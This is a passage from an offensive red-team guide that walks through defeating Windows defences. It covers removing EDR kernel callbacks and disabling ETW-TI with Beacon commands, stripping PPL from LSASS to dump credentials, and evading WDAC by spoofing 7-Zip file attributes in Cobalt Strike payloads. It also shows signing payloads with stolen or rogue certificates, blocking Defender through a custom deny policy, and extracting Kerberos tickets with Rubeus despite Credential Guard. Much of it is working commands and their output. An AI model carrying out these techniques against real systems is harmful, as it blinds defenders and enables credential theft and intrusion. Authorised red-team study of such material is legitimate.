Some EDRs alert when the kernel image is loaded into a process. Running the BOF inside a Microsoft-signed executable defeats some of them. For more aggressive EDRs, skip the image load entirely and use a pre-calculated offset table keyed by kernel version.

6.3 Disabling Kernel Telemetry

This section walks through using RTCore64 and the kernel BOFs to disable specific kernel-resident protections and telemetry.

6.4 Kernel callbacks

What are kernel callbacks? Windows lets drivers register functions that the kernel calls automatically when specific events happen. For example, a process callback fires every time a new process is created — this is how an EDR knows about every process launch on the system, even if the process tries to hide. A thread callback fires on new threads, an image-load callback fires when a DLL or EXE is loaded into memory, and so on.

By removing an EDR's callbacks, we blind it to those events. If we remove the EDR's process-creation callback, it no longer gets notified when we spawn new processes. If we remove its image-load callback, it no longer sees DLLs being loaded — including our payload DLLs.

list_callbacks dumps all process, thread, image-load, handle-op, and registry callbacks registered with the kernel. The output shows which driver owns each entry — look for the EDR's driver name (e.g. WdFilter.sys for Windows Defender, KslD.sys for Kaspersky):

beacon> list_callbacks
[*] Tasked Beacon to list kernel callbacks

-----------------

[0] 0xFFFFF8025F7F22D0 (cng.sys)
[1] 0xFFFFF802611A0030 (WdFilter.sys)
[2] 0xFFFFF8025FAD6E10 (ksecdd.sys)
[3] 0xFFFFF8025FCD0F10 (dxgkrnl.sys)
[4] 0xFFFFF80261981F10 (tcpip.sys)
[5] 0xFFFFF80261F10710 (iorate.sys)
[6] 0xFFFFF80260240F60 (CI.dll)
[7] 0xFFFFF80262284DE0 (UCPD.sys)
[8] 0xFFFFF80262320D00 (peauth.sys)
[9] 0xFFFFF80264FACC10 (KslD.sys)

[1] 0xFFFFF8003C9D0030 (WdFilter.sys) [REMOVED]
[2] 0xFFFFF8003B306E10 (ksecdd.sys)
[3] 0xFFFFF8003B500F10 (dxgkrnl.sys)
[4] 0xFFFFF8003D1B1F10 (tcpip.sys)
[5] 0xFFFFF8003D740710 (iorate.sys)
[6] 0xFFFFF8003BA70F60 (CI.dll)
[7] 0xFFFFF8003DA04DE0 (UCPD.sys)
[8] 0xFFFFF8003FA10D00 (peauth.sys)
[9] 0xFFFFF8003FB2CC10 (KslD.sys)
[10] 0xFFFFF8003FAD1B80 (wtd.sys)

6.5 ETW-TI

What is ETW-TI? ETW (Event Tracing for Windows) is Windows' built-in logging framework. ETW-TI is a special "Threat Intelligence" provider that only the kernel can write events to, and only PPL-protected security processes (like Defender) can read from. It reports high-value security events — process injection attempts, suspicious memory permission changes, handle access to sensitive processes — directly from the kernel. Unlike user-mode ETW (which we can patch by modifying ntdll in our own process), ETW-TI lives in kernel memory and requires a kernel write primitive to disable.

Each ETW provider has a GUID (a unique identifier) and an IsEnabled flag in kernel memory. If we set IsEnabled to 0, the provider stops generating events — the EDR's telemetry feed goes dark for that provider.

etw_enum takes an ETW provider GUID, locates it in the relevant hash bucket, and returns the value of the IsEnabled field. etw_disable patches IsEnabled to 0x0 to silence it:

beacon> etw_enum {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
[*] Tasked Beacon to enum ETW-TI provider

ProviderEnableInfo.IsEnabled == 1

beacon> etw_disable {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
[*] Tasked Beacon to disable ETW-TI provider

beacon> etw_enum {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
[*] Tasked Beacon to enum ETW-TI provider

ProviderEnableInfo.IsEnabled == 0

6.6 Protected Processes

Why this matters: Even as a local administrator, you cannot dump credentials from LSASS if it runs as a Protected Process Light (PPL). Tools like Mimikatz need to read LSASS memory (PROCESS_VM_READ), but the kernel strips that access right from any handle opened by a non-protected process. This is the single biggest obstacle to credential dumping on modern Windows.

Protected Processes (PP) launched in Windows Vista as a DRM enforcement mechanism. The kernel restricts what access rights a non-protected process can obtain to a protected one — even an admin calling OpenProcess with PROCESS_ALL_ACCESS gets a handle with the sensitive rights (PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_TERMINATE, etc.) stripped out.

Protected Process Light (PPL) extended this with a hierarchical signer model. Higher signer levels can access lower ones but not vice versa. The protection level for a process is stored in EPROCESS->Protection as a _PS_PROTECTION struct:

struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type:   3;
            UCHAR Audit:  1;
            UCHAR Signer: 4;
        };
    };
};

Windows 11 enables PPL on LSASS by default, so credential dumping against LSASS is denied even for admins. Use ppenum to view the protection level on a target PID:

beacon> ppenum 1008
[*] Tasked Beacon to enum protection level

Level  : 0x41
Audit  : 0
Type   : PsProtectedTypeProtectedLight
Signer : PsProtectedSignerLsa

pppatch reaches into EPROCESS->Protection and overwrites the signer level. Specifying 0 (PsProtectedSignerNone) removes PPL protection entirely — after which LSASS dumps succeed:

beacon> help pppatch
Usage: pppatch [pid] [level]
   
[level] can be
  0 = PsProtectedSignerNone
  1 = PsProtectedSignerAntimalware
  2 = PsProtectedSignerLsa

beacon> pppatch 1008 0
[*] Tasked Beacon to patch protection level

beacon> ppenum 1008
[*] Tasked Beacon to enum protection level

Level  : 0x0
Audit  : 0
Type   : PsProtectedTypeNone
Signer : PsProtectedSignerNone

7. WDAC Bypass

What is WDAC? Windows Defender Application Control (WDAC), now called App Control for Business, is a security feature that only allows pre-approved programs to run. Think of it as a bouncer at a club door — if your executable isn't on the guest list, it doesn't get in. Unlike antivirus (which tries to identify bad programs), application control only allows known-good programs and blocks everything else.

Why this matters for red teamers: If the target has WDAC enabled, you cannot simply drop a payload on disk and run it — the kernel will block execution before the first instruction runs. You need to either find a way to run code through an already-approved application (a "Living Off the Land" binary, or LOLBAS), abuse a weakness in the policy itself, or sign your payload with a trusted certificate. WDAC is kernel-enforced, meaning it cannot be disabled or bypassed from user mode the way AppLocker can.

Compared to AppLocker:

FeatureAppLockerApp Control
EnforcementUser-mode service (AppIDSvc)Kernel
Microsoft's classificationDefence-in-depthOfficial security boundary
Bypass shelf-lifeLongPatched when reported

7.1 App Control policies

App Control rules can match on:

  • The path where the app exists on disk.
  • Attributes of the app's binary (OriginalFilename, Version, file hash).
  • The app's reputation according to Microsoft's Intelligent Security Graph (ISG).
  • The code-signing certificate used to sign the app.

Policies start as XML, authored with New-CIPolicy or the App Control for Business Wizard. The common pattern is a single base policy (allowing core Windows components, store apps, Office 365, WHQL drivers) plus one or more supplemental policies for third-party and LOB applications.

Since Windows 10 1903 / Server 2022, admins can deploy multiple policies side-by-side — including both enforced and audit policies simultaneously. The raw XML is compiled to .cip (Code Integrity Policy) binary format and copied to C:\Windows\System32\CodeIntegrity\CIPolicies\Active to take effect.

7.2 WDACTools

Matt Graeber's WDACTools PowerShell module builds, configures, deploys, and audits WDAC / App Control policies. The schema isn't 100% current, but it's the practical analysis option — App Control puts PowerShell in constrained language mode, so analyse .cip files offline. ConvertTo-WDACCodeIntegrityPolicy reverses a binary .cip back to XML:

PS C:\Users\Attacker\Desktop\CIPs> ipmo C:\Tools\WDACTools\WDACTools.psd1
PS C:\Users\Attacker\Desktop\CIPs> ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath '.\{e01193e3-74ca-4f99-83d7-1a9522374b3f}.CIP' -XmlFilePath '.\{e01193e3-74ca-4f99-83d7-1a9522374b3f}.xml'

The PolicyID / BasePolicyID fields tell you whether this is a base or supplemental policy — matching values mean base, differing means supplemental:

<PolicyID>{E01193E3-74CA-4F99-83D7-1A9522374B3F}</PolicyID>
<BasePolicyID>{E01193E3-74CA-4F99-83D7-1A9522374B3F}</BasePolicyID>

7.3 Rule options

Rule options control policy-wide behaviour. They appear as an <Option> entry inside <Rules>:

<Rules>
  <Rule>
    <Option>Enabled:UMCI</Option>
  </Rule>
  ...
</Rules>

Key options to look for when reversing a policy:

OptionDefaultAttacker impact
Audit ModeOn for new policiesLogs only — nothing is blocked
UMCIOff unless addedOff ⇒ only drivers restricted; user-mode binaries free
Unsigned System Integrity PolicyOnOn ⇒ policy files don't need a trusted-CA signature
Update Policy No RebootOffOn ⇒ supplemental policies apply immediately
Runtime FilePath Rule ProtectionOnOff ⇒ standard users can drop into whitelisted paths
Dynamic Code SecurityOffOff ⇒ .NET LOTL bypasses (MSBuild, Workflow.Compiler) work

7.3.1 Audit Mode

Logs what would have been blocked instead of blocking it. The default for new policies.

7.3.2 UMCI

User-Mode Code Integrity. Restricts both kernel-mode and user-mode binaries. Disabling it restricts only drivers.

7.3.3 Unsigned System Integrity Policy

Allows the policy file itself to remain unsigned. Enabled by default. Disabling forces a trusted-CA signature on policy files.

7.3.4 Update Policy No Reboot

Lets policy updates apply without rebooting.

7.3.5 Runtime FilePath Rule Protection

Enabled by default. Performs a runtime writability check on FilePath-rule paths — if a non-admin can write there, execution from the path is denied even though it's allow-listed.

7.3.6 Dynamic Code Security

Disabled by default. When enabled, enforces the policy for .NET and other dynamic-runtime code — blocks tools like Microsoft.Workflow.Compiler and MSBuild for code execution.

7.4 Default signers and EKUs

Base policies typically allow Microsoft's default Windows certificates. The challenge with analysing reversed XML is that signer names aren't preserved — the original might be:

<Signer Name="MincryptKnownRootMicrosoftProductRoot1997" ID="ID_SIGNER_MICROSOFT_PRODUCT_1997">
  <CertRoot Type="Wellknown" Value="04" />
</Signer>

And the reversed version comes out as a generic name:

<Signer Name="Signer 1" ID="ID_SIGNER_S_0001">
  <CertRoot Type="Wellknown" Value="04" />
</Signer>

EKUs do retain their friendly names, which gives a hint as to what's being trusted:

<EKUs>
  <EKU ID="ID_EKU_E_0001" Value="010A2B0601040182374C0301" FriendlyName="Windows Store" />
</EKUs>

So a reasonable assumption from these snippets is "all Microsoft-signed binaries plus Windows Store".

7.5 Supplemental policies

Supplemental policies extend a base policy with additional allow rules. Their BasePolicyID points at the base they extend. For example, allowing 7zFM.exe from Program Files:

<PolicyID>{C3C533E1-8D36-41E5-BD04-7E096BCE1C8D}</PolicyID>
<BasePolicyID>{E01193E3-74CA-4F99-83D7-1A9522374B3F}</BasePolicyID>
...
<FileRules>
  <Allow ID="ID_ALLOW_PATH_0" FriendlyName="7-Zip" FilePath="%OSDRIVE%\Program Files\7-Zip\7zFM.exe"/>
</FileRules>
...

Supplemental policies only support allow rules. Deny rules must live in a base policy.

7.6 Deny rules

Deny rules go in the base policy and always take precedence over allow rules — useful for blocking specific binaries even if the broader signer rule would allow them. This blocks regedit.exe and any RefreshPolicy.exe below version 10.0.19042.0:

<FileRules>
  <Deny ID="ID_DENY_D_0001" FilePath="%WINDIR%\regedit.exe"/>
  <FileAttrib ID="ID_FILEATTRIB_F_0002" FileName="RefreshPolicy.exe" MinimumFileVersion="10.0.19042.0"/>
</FileRules>

7.7 Policy Misconfigurations

App Control is an official security boundary, so direct technique bypasses are patched quickly and have short shelf-lives. The reliable approach is misconfiguration — gaps in admin-deployed policies.

7.8 Audit-only policies

Microsoft recommends deploying policies in audit mode first to gauge business impact, then switching to enforce. The default for newly-authored policies is audit, and admins regularly forget to flip the switch. You'll find environments running real policies in audit only — activity is logged, but nothing is blocked.

7.9 File attributes

File rules can match on attributes (OriginalFileName, ProductName) instead of path or hash — useful for installers and portable apps without a fixed location. For example:

<FileRules>
  <Allow ID="ID_ALLOW_A_1" FriendlyName="Allow 7Zip installer" FileName="7zipInstall.exe" ProductName="7-Zip"/>
</FileRules>

This is weak because anyone can build a binary with matching attributes. Modify resource.rc in Cobalt Strike's Artifact Kit so that generated payloads carry the required attributes. Default resource.rc:

#define VER_FILEVERSION             10,0,19041,1266
#define VER_FILEVERSION_STR         "10,0,19041,1266\0"

#define VER_PRODUCTVERSION          10,0,19041,1266
#define VER_PRODUCTVERSION_STR      "10,0,19041,1266\0"

BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName", "Microsoft Corporation"
            VALUE "FileDescription", "Windows Explorer"
            VALUE "FileVersion", "10.0.19041.1266 (WinBuild.160101.0800)"
            VALUE "InternalName", "explorer"
            VALUE "LegalCopyright", "\xA9 Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "EXPLORER.EXE"
            VALUE "ProductName", "Microsoft\xAE Windows\xAE Operating System"
            VALUE "ProductVersion", "10.0.19041.1266"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1266
    END
END

//IDI_ICON1               ICON                    "src-main/icon.ico"

Change OriginalFilename and ProductName to match the rule. Set the other fields to be plausible too so the binary holds up to a quick visual inspection:

#define VER_FILEVERSION             25,0,0,1
#define VER_FILEVERSION_STR         "25,0,0,1\0"
 
#define VER_PRODUCTVERSION          25,0,0,1
#define VER_PRODUCTVERSION_STR      "25,0,0,1\0"

BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName", "Igor Pavlov"
            VALUE "FileDescription", "7-Zip Installer"
            VALUE "FileVersion", "25.1.0.0"
            VALUE "InternalName", "7-Zip"
            VALUE "LegalCopyright", "Copyright (c) 1999-2025 Igor Pavlov"
            VALUE "OriginalFilename", "7zipInstall.exe"
            VALUE "ProductName", "7-Zip"
            VALUE "ProductVersion", "25.01"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1266
    END
END

IDI_ICON1               ICON                    "src-main/7zip.ico"

Rebuild the kit and reload the Aggressor script. New executable payloads will carry the matching file attributes:

$ ./build.sh mailslot HeapAlloc 344564 0 true false none /mnt/c/Tools/cobaltstrike/artifacts

7.10 Path wildcards

Admins sometimes whitelist entire directories with wildcards like %OSDRIVE%\App-V\*. The runtime writability check (when Runtime FilePath Rule Protection is enabled) restricts these: if the directory or file allows write access to any principal outside the admin SID list, execution is denied.

App Control's admin SID list includes:

SIDPrincipal
S-1-3-0Creator Owner
S-1-5-18LocalSystem
S-1-5-19 / S-1-5-20LocalService / NetworkService
S-1-5-32-544Administrators
S-1-5-32-549 / 550 / 551Server / Print / Backup Operators
S-1-5-32-577RDS Management Servers
S-1-5-32-559 / 568Performance Log Users / IIS_IUSRS

So writability checks pass if you control a local administrator. If Runtime FilePath Rule Protection is disabled in the policy, even standard users can drop a payload into the whitelisted directory and execute it.

7.11 Living Off The Land

As with AppLocker, multiple signed and trusted Windows binaries allow arbitrary code execution through them. Jimmy Bayne's UltimateWDACBypassList catalogues most known bypasses.

.NET compilation tools are popular because they execute dynamic code at runtime. Microsoft.Workflow.Compiler ships with all Windows builds and runs arbitrary C# from a XOML file. First, the compiler-input XML:

<?xml version="1.0" encoding="utf-8"?>
    <CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
        <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
            <d2p1:string>pwn.xoml</d2p1:string>
        </files>
        <parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
            <assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
            <compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
            <coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssemblyFileName>
            <embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
            <evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
            <generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</generateExecutable>
            <generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">true</generateInMemory>
            <includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</includeDebugInformation>
            <linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
            <mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
            <outputName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
            <tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
            <treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</treatWarningsAsErrors>
            <warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">-1</warningLevel>
            <win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
                <d2p1:checkTypes>false</d2p1:checkTypes>
                <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>
                <d2p1:compilerOptions i:nil="true" />
                <d2p1:generateCCU>false</d2p1:generateCCU>
                <d2p1:languageToUse>CSharp</d2p1:languageToUse>
                <d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" />
                <d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" />
                <d2p1:mtInfo i:nil="true" />
                <d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" />
        </parameters>
    </CompilerInput>

Then the XOML file with C# code embedded:

<SequentialWorkflowActivity x:Class="Workflow" x:Name="Workflow"
	xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
	xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
	<CodeActivity x:Name="CodeActivity" />
	<x:Code>
		<![CDATA[
    public class Test : SequentialWorkflowActivity
    {
        public Test()
        {
            Console.WriteLine("Hello World");
        }
    }
    ]]>
	</x:Code>
</SequentialWorkflowActivity>

Then invoke Microsoft.Workflow.Compiler.exe:

C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe test.xml output.xml
Hello World

This (and MSBuild, etc.) only works when Dynamic Code Security is disabled in the policy.

7.11.1 Electron

Signed Electron apps run JavaScript at runtime through the Chromium engine and Node.js APIs — with full access to the local filesystem and processes. Bobby Cooke's Loki C2 platform is built around this. Many Electron apps (Teams, VS Code, GitHub Desktop) ship without ASAR integrity checking, so their JavaScript files can be swapped for backdoored versions and execution still goes through the trusted, signed parent process.

7.12 Trusted CAs

Internal LOB apps may be signed with code-signing certs from a trusted CA — an internal one or a third-party purchase. Trust rules come in two formats. The first ties the rule to a CA cert plus a publisher name — any cert issued by the CA with a matching CN is trusted:

<Signers>
  <Signer Name="Signer 1" ID="ID_SIGNER_S_0001">
    <CertRoot Type="TBS" Value="D3D6E1BFF66C74E2244B707C93F1BED794E1BC420F4F7E6C1EC92290B99A658C"/>
    <CertPublisher Value="CONTOSO Signing Certificate"/>
  </Signer>
</Signers>

The TBS value is a SHA256 of the certificate's tbsCertificate field (subject, issuer, etc.).

The second form pins to a single issued cert — only binaries signed by that exact certificate are trusted:

<Signer Name="Signer 1" ID="ID_SIGNER_S_0001">
  <CertRoot Type="TBS" Value="772041DBF379E355C44DE6691145D95C0D1D10A88542848D1A1D283CC2C980E2"/>
</Signer>

If you find the exact code-signing cert on disk (with its export password), use signtool.exe from the Windows SDK to sign your payload directly:

C:\Users\Attacker>"C:\Program Files (x86)\Windows Kits\10\bin\10.0.26100.0\x64\signtool.exe" sign /f .\Desktop\signing-cert.pfx /p "pass123" /fd SHA256 C:\Payloads\http_x64.exe
Done Adding Additional Store
Successfully signed: C:\Payloads\http_x64.exe

If the rule has a CertPublisher (CA-wide trust), you can request your own code-signing cert from the CA via CSR — assuming you control a principal with enroll rights on the template. Enumerate ADCS templates with certutil -template; the DACL shows enroll permissions:

>certutil -template
...
Template[7]:
  TemplatePropCommonName = ContosoCodeSigning
  TemplatePropFriendlyName = Contoso Code Signing
  TemplatePropSecurityDescriptor = O:S-1-5-21-773600054-2680648724-1199926119-500G:S-1-5-21-773600054-2680648724-1199926119-519D:PAI(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DU)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-773600054-2680648724-1199926119-519)(A;;LCRPRC;;;DU)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-773600054-2680648724-1199926119-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-773600054-2680648724-1199926119-500)(A;;LCRPLORC;;;AU)

    Allow Enroll        CONTOSO\Domain Users
    Allow Enroll        CONTOSO\Domain Admins
    Allow Enroll        CONTOSO\Enterprise Admins
    Allow Read  CONTOSO\Domain Users
    Allow Full Control  CONTOSO\Domain Admins
    Allow Full Control  CONTOSO\Enterprise Admins
    Allow Full Control  CONTOSO\Administrator
    Allow Read  NT AUTHORITY\Authenticated Users

certutil -TemplateCAs identifies which CA(s) publish the template:

>certutil -TemplateCAs ContosoCodeSigning
lon-cs-1.contoso.com\sub-ca

Create a Java keystore on the team server, matching CN to the CertPublisher name:

attacker@ubuntu:/opt/cobaltstrike$ keytool -genkey -alias server -keyalg RSA -keysize 2048 -storetype jks -keystore keystore.jks -dname "CN=CONTOSO Signing Certificate"
Enter keystore password: password

Generate the CSR:

attacker@ubuntu:~$ keytool -certreq -alias server -file csr.req -keystore keystore.jks
Enter keystore password: password

Submit it to the CA, requesting the full chain:

>certreq -submit -config "lon-cs-1.contoso.com\sub-ca" -attrib "CertificateTemplate:ContosoCodeSigning" csr.req cert.cer fullchain.p7b

Import the chain back into the keystore:

attacker@ubuntu:~$ cp /opt/pwnlift/Uploads/fullchain.p7b .
attacker@ubuntu:~$ keytool -import -trustcacerts -alias server -file fullchain.p7b -keystore keystore.jks
Enter keystore password:

...

... is not trusted. Install reply anyway? [no]: yes
Certificate reply was installed in keystore

Move the keystore to the profiles directory:

attacker@ubuntu:~$ mv /home/attacker/keystore.jks /opt/cobaltstrike/profiles/

And add a code-signer block to the C2 profile. After restarting the team server, the code-signing option becomes available in the payload generator:

code-signer {
    set keystore "keystore.jks";
    set password "password";
    set alias "server";
}

7.13 Weaponising App Control

With local admin access to a protected endpoint, you can modify the deployed App Control policy — whitelist your own tools, or deny AV/EDR from running. Author policies with the ConfigCI PowerShell module, the App Control Wizard, or third-party tools like WDACTools.

7.14 Supplemental policies

Supplemental policies can only extend trust — allow rules only, no deny rules. They're useful for whitelisting your own payloads, tools, and scripts.

In the App Control Wizard:

  1. Select Policy Creator.
  2. Choose Multiple Policy Format + Supplemental Policy.
  3. Provide the GUID of the base policy to extend (from the reversed CIP files).
  4. In File Rules, click + Add Custom and build targeted rules — don't whitelist C:\* or similar broad paths.
  5. Let the wizard save the XML and compiled CIP.

Copy the CIP to the target and apply it with CiTool (installed by default on Windows 11 22H2+ and Server 2025). With Update Policy No Reboot enabled, the policy applies immediately:

C:\Users\rsteel\Downloads>CiTool -up "{59481154-4FF1-48C3-99C4-248ED538E93E}.cip"
Operation Successful
Press Enter to Continue

Remove a policy with --remove-policy (-rp).

7.15 Deny-only base policies

Deny rules must live in a base policy. Modifying the existing base is risky — deploy a custom deny-only base policy alongside it instead, since multiple base policies can coexist (an app must be allowed by every base policy to run).

The wizard can't create a deny-only policy from scratch. Start from the AllowAll template at C:\Windows\schemas\CodeIntegrity\ExamplePolicies\AllowAll.xml. Starting from "allow all" sounds backward, but it's required — an empty base implicitly denies everything not explicitly allowed, which bricks the host.

Walkthrough:

  1. Open the App Control Wizard → Policy Editor.
  2. Open AllowAll.xml, save to a different location.
  3. In the file rules, you'll see two allow rules (user-mode and kernel-mode).
  4. Add your custom rule with action set to Deny — e.g. C:\Program Files\Windows Defender\MsMpEng.exe to block Defender.

If the target process is already running (like MsMpEng.exe), a reboot is needed before the deny takes effect.

8. Credential Guard Bypass

What is Credential Guard? In a traditional Windows environment, when a user logs in, their password hash and Kerberos tickets are stored in the LSASS process. Attackers with admin access can dump LSASS memory (using Mimikatz, for example) and extract those credentials to impersonate users across the network. Credential Guard is Microsoft's answer to this — it moves those secrets into a hardware-backed vault that even administrators cannot read.

The practical impact: On a system with Credential Guard enabled, the standard "dump LSASS, get hashes, pass-the-hash" attack chain is broken. You need to use alternative credential access techniques that target secrets Credential Guard does not protect.

8.1 Credential Guard Secrets

Credential Guard uses hardware virtualisation (VBS — Virtualisation-Based Security) and the Windows hypervisor to isolate authentication materials — NTLM hashes, Kerberos TGTs, etc. — in a secure virtual container. Even a SYSTEM-level process cannot peek inside. It blocks techniques like Mimikatz sekurlsa::ekeys and Rubeus dump.

StateSecrets live inProcess
Credential Guard offLocal Security Authoritylsass.exe
Credential Guard onIsolated LSA (VBS enclave)LSAIso.exe

VBS is an official Microsoft security boundary: data inside the enclave cannot be accessed or tampered with from the outside. Don't confuse Credential Guard with LSA Protected Process (RunAsPPL).

8.2 No TGTs for You

Background for beginners: Kerberos authentication works with tickets. When you log into a domain, you get a TGT (Ticket Granting Ticket) — think of it as a master key that lets you request access to any service. Normally, an attacker who steals a TGT can impersonate that user for anything. Credential Guard's main job is to make TGTs unstealable.

When a user first logs in, LSA passes the initial credentials to LSAIso and asks it to store them. LSAIso stores them and returns a handle that LSA uses to reference them later, then LSA destroys its copy. To obtain a TGT, LSA must ask LSAIso to encrypt the AS-REQ timestamp using the credential handle — the secrets themselves never leave the secure enclave.

When the AS-REP arrives, LSA cannot decrypt the logon session key because it no longer knows the user's password. It passes the AS-REP to LSAIso for decryption, but LSAIso does not return the decrypted session key — it re-encrypts it with a key only it knows. All subsequent TGS-REQs are handled the same way: LSA gives the request to LSAIso to encrypt the authenticator, and LSAIso decrypts the returned TGS-REP.

From an attacker's perspective, you can dump encrypted TGTs but the KeyType will show as something like *_credguard. Attempting to use the TGT for anything (e.g. asktgs) will fail. Rubeus crafts Kerberos messages from scratch and sends them directly to the KDC on port 88 — it cannot talk to LSAIso and cannot access the TGT's logon session key. This breaks many Kerberos abuse primitives:

PrimitiveImpact
Unconstrained delegationNot permitted by Credential Guard — relaying tactics no longer work
Constrained delegation / RBCDMuch harder — the TGT is the lynchpin
S4U abuseRequires raw port-88 traffic in a very specific shape; no known LSA path achieves the same outcome

8.3 Extracting Service Tickets

Why service tickets work: Unlike TGTs (which Credential Guard locks inside the enclave), service tickets are handed back to the calling process in cleartext so it can present them to the target service. Credential Guard protects the master key (TGT) but not the individual access tokens (service tickets) derived from it. This means: if a user has already authenticated to a service (e.g. connected to a file share, logged into a web app), you can extract that service ticket from memory and reuse it.

VBS is a security boundary, so extracting TGTs or their session keys from LSAIso should not be expected to work (any such vulnerabilities are quickly patched). Lean into credential access tactics that Credential Guard does not protect:

SourceNotes
Kerberos service ticketsNot protected — extractable and reusable without restriction
Keylogged credentialsCaptured at the keystroke layer, never enters the enclave
Local accounts (SAM)SAM database is outside the enclave
Domain cached credentials (DCC)Cached separately from LSAIso
Third-party credential storesVendor apps that hold their own credentials
Client authentication certificatesSee PKINIT path below

Because service tickets are not protected by Credential Guard, they can be extracted from memory and re-used without restriction. Triage the host to see what tickets are cached:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

If a logon session has a TGT but no useful service tickets, asktgs supports submitting a TGS-REQ via the LSA using that session's TGT. This requires elevated context to request tickets from sessions other than your own:

# Triage to find a session with a TGT

8.4 TGTs from Plaintext Password

If you obtain the plaintext password of a user (e.g. through keylogging, cracking DCC hashes, or from an insecure application), asktgt will get you a useable TGT despite Credential Guard being in place. This works because Rubeus sends the AS-REQ directly to the KDC rather than going through LSA:

Sliver equivalent: Same Rubeus invocation, just routed through the armory-installed extension or execute-assembly:

sliver (SESSION) > rubeus asktgt /user:rsteel /domain:CONTOSO.COM /password:Passw0rd! /enctype:aes256 /nowrap

# Or via execute-assembly if you keep your own Rubeus build
sliver (SESSION) > execute-assembly --amsi-bypass --etw-bypass \
                   /opt/dotnet/Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /password:Passw0rd! /enctype:aes256
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /password:Passw0rd! /enctype:aes256 /nowrap

8.5 PKINIT Certificates

User and computer certificates in the Certificate Store are not protected by Credential Guard. If the environment supports authentication with PKINIT, you can dump these certificates and use them to obtain useable TGTs — particularly useful for obtaining TGTs of computer accounts.

  • Extract user certificates using SharpDPAPI's certificates /unprotect command
  • Extract computer certificates using certificates /machine (requires local admin)

Extract certificates with SharpDPAPI:
